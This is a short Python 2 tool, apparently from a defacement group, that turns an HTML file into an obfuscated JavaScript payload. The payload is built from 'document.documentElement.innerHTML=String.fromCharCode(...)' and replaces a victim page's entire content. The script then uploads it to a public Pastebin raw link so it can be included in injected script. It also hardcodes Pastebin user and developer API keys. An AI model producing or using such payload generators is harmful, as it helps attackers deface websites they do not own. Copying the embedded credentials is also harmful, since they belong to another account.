# -*- coding: utf-8 -*-
import sys, os, time, requests, random
C0 = '\033[0;36m'
G0 = '\033[0;32m'
W0 = '\033[0;37m'
R0 = '\033[0;31m'
Y0 = '\033[0;33m'
def main():
 try:
  print """%s
       _______ ____ 
      / / ___// __ \ %sAuthor by abilseno11%s
 __  / /\__ \/ / / / %sGithub github.com/AbilSeno%s
/ /_/ /___/ / /_/ /  %sTeam anoncybfakeplayer%s
\____//____/\____/   JSO Script Generator
                    """%(C0,W0,C0,W0,C0,W0,C0)

  b=[]
  pek = raw_input('%s[%s?%s] %sName file : '%(W0,R0,W0,W0))
  hayu = open(pek,'r').read()
  for l in range(len(hayu)):
   b.append(str(ord(hayu[l]))+',')
  epe = ' '.join(b)
  h = epe.rstrip(',')
  with open('jso.txt','w') as babi:
   babi.write('document.documentElement.innerHTML=String.fromCharCode(%s)'%h)
  print "%s[%s✓%s] %sOk, Saved as %sjso.txt"%(W0,R0,W0,W0,C0)
  print "%s[%s-%s] %sUploading to Pastebin..."%(W0,R0,W0,W0)
  time.sleep(3)
  temp = requests.post("https://pastebin.com/api/api_post.php",data={'api_paste_format':'javascript','api_option':'paste','api_user_key':'3e74028810d51103a9b21884fc5f4f9e','api_paste_private':'0','api_paste_name':str(random.randint(0,10000)),'api_paste_expire_date':'N','api_dev_key':'dzxq1yufRgqc4AUmNd9WNxZ7avMBG6Jj','api_paste_code':open('jso.txt','r').read()}).text
# print temp
  print "%s[%s✓%s] %sOk, success upload to %shttps://pastebin.com/raw/%s"%(W0,R0,W0,W0,C0,str(temp[21:]))
 except IOError:
   print "%s[%s!%s] %sFile%s %s %sdoes not exist!!"%(W0,R0,W0,R0,C0,pek,R0)
   main()
 except KeyboardInterrupt:
   print "%s[%s-%s] %sOk, bye"%(W0,R0,W0,W0)
main()
